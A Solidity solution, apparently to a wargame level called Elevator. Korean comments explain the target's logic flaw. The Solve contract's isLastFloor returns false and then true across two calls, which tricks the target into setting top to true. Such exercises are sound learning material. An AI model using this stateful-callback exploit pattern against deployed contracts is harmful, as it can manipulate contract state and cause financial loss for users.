// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

/* Elevator.goTo(uint256) 함수 동작 방식 정리
 * 1. Building 컨트랙트의 주소를 msg.sender로 지정
 * 2. building.isLastFloor(_floor)의 결과값이 false일 경우 if 문 내부 진입
 * 2-1. floor를 _floor 와 동일하게 바꿔줌
 * 2-2. top을 building.isLastFloor(floor)의 결과로 대입
 *
 * 취약점
 * Business Logic Flaw
 *
 * 목표
 * goTo 함수 실행 후 top 변수가 true가 되도록 설정
 *
 * 공격 방식
 * 1. building.isLastFloor(_floor)의 최초 실행 시점에는 floor 값이 동일하지 않도록 판정하여 false 반환
 * 2. 1번 과정에서 공격자 컨트랙트의 floor 값을 _floor 값으로 설정
 * 3. 두번째 building.isLastFloor(_floor) 실행 시점에서 floor 값이 동일한 것으로 판정하여 true 반환
 * 4. 3번의 동작으로 인해 Elevator 컨트랙트의 top 변수가 false에서 true로 설정
 */


interface Elevator {
    function top() external returns (bool);
    function floor() external returns (uint256);
    function goTo(uint256) external;
}

contract Solve {
    address public target;
    uint256 public floor;

    constructor(address _target) {
        target = _target;
        floor = 1000000000;
    }

    function attack() public {
        Elevator(target).goTo(Elevator(target).floor());
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (floor != _floor) {
            floor = _floor;
            return false;
        } else {
            return true;
        }
    }
}